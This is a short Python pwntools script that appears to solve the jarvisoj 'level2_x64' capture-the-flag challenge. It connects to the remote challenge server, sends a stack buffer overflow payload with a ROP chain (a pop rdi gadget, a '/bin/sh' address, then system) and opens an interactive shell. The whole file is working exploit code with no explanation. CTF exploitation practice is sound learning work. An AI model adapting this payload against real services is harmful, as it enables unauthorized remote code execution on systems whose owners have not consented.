#! /usr/bin/python

from pwn import *

p = remote('pwn2.jarvisoj.com',9882)
elf = ELF('./level2_x64')

offset = 0x80
system = elf.symbols['system']
sh = 0x0000000000600a90
pop_rdi = 0x00000000004006b3

payload = 'A' * offset + 'deadbeef' + p64(pop_rdi) + p64(sh) + p64(system) + 'deadbeef'
p.sendline(payload)

p.interactive()
